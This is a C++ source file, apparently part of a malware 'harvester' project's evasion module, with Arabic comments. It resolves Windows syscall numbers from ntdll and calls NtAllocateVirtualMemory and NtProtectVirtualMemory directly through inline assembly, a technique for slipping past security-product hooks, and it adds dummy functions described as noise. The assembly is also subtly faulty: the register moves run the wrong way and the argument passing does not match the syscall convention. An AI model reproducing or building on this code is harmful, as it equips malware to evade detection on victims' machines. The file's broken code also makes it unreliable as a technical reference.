// harvester/evasion/syscall_injection.cpp
// إصدار قوي – استدعاءات نظام غير مباشرة لـ x64 (MinGW/GCC)
#include "syscall_injection.h"
#include <windows.h>
#include <winternl.h>
#include <vector>
#include <cstdint>

#pragma comment(lib, "ntdll.lib")

#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)

// --------------------------------------------------------------
// بنية لتخزين رقم السيسكول وعنوانه (احتياطي)
// --------------------------------------------------------------
typedef struct _SYSCALL_ENTRY {
    DWORD number;
    FARPROC address;
} SYSCALL_ENTRY;

static SYSCALL_ENTRY syscalls[2];
static bool syscallsInitialized = false;

// --------------------------------------------------------------
// استخراج رقم السيسكول من ntdll.dll (البحث عن mov eax, imm32)
// --------------------------------------------------------------
DWORD GetSyscallNumber(const char* functionName) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;
    
    BYTE* func = (BYTE*)GetProcAddress(ntdll, functionName);
    if (!func) return 0;
    
    // البحث عن أول تعليمة mov eax, imm32 (B8 xx xx xx xx)
    for (int i = 0; i < 32; i++) {
        if (func[i] == 0xB8) {
            return *(DWORD*)(func + i + 1);
        }
    }
    return 0;
}

// --------------------------------------------------------------
// تهيئة جدول السيسكولات المطلوبة
// --------------------------------------------------------------
void InitSyscalls() {
    if (syscallsInitialized) return;
    
    syscalls[0].number = GetSyscallNumber("NtAllocateVirtualMemory");
    syscalls[1].number = GetSyscallNumber("NtProtectVirtualMemory");
    
    syscallsInitialized = true;
}

// --------------------------------------------------------------
// تنفيذ سيسكول غير مباشر مع 6 معاملات
// باستخدام inline assembly بصيغة AT&T (مناسبة لـ MinGW)
// --------------------------------------------------------------
__attribute__((naked))
static NTSTATUS SyscallExecute(DWORD number, uintptr_t a1, uintptr_t a2, uintptr_t a3,
                               uintptr_t a4, uintptr_t a5, uintptr_t a6) {
    __asm__ volatile (
        "mov %eax, %ecx\n\t"   // syscall number -> eax
        "mov %rdx, %r10\n\t"   // second argument -> r10 (as required by syscall)
        "syscall\n\t"
        "ret\n\t"
    );
}

// --------------------------------------------------------------
// تخصيص ذاكرة باستخدام NtAllocateVirtualMemory عبر سيسكول
// --------------------------------------------------------------
NTSTATUS SyscallAllocateMemory(HANDLE hProcess, PVOID* baseAddr, SIZE_T regionSize,
                               DWORD allocationType, DWORD protect) {
    InitSyscalls();
    if (syscalls[0].number == 0) return STATUS_UNSUCCESSFUL;
    
    SIZE_T size = regionSize;
    return SyscallExecute(syscalls[0].number,
                          (uintptr_t)hProcess,
                          (uintptr_t)baseAddr,
                          0,                     // ZeroBits
                          (uintptr_t)&size,
                          allocationType,
                          protect);
}

// --------------------------------------------------------------
// تغيير حماية الذاكرة باستخدام NtProtectVirtualMemory عبر سيسكول
// --------------------------------------------------------------
NTSTATUS SyscallProtectMemory(HANDLE hProcess, PVOID* baseAddr, PSIZE_T regionSize,
                              DWORD newProtect, PDWORD oldProtect) {
    InitSyscalls();
    if (syscalls[1].number == 0) return STATUS_UNSUCCESSFUL;
    
    return SyscallExecute(syscalls[1].number,
                          (uintptr_t)hProcess,
                          (uintptr_t)baseAddr,
                          (uintptr_t)regionSize,
                          newProtect,
                          (uintptr_t)oldProtect,
                          0);
}

// --------------------------------------------------------------
// دوال وهمية لإضافة ضجيج
// --------------------------------------------------------------
void DummySyscallFunction1() {
    volatile DWORD x = 0;
    for (int i = 0; i < 100; i++) x += i;
}

void DummySyscallFunction2() {
    volatile BYTE buf[64];
    for (int i = 0; i < 64; i++) buf[i] = (BYTE)(i ^ 0xAA);
}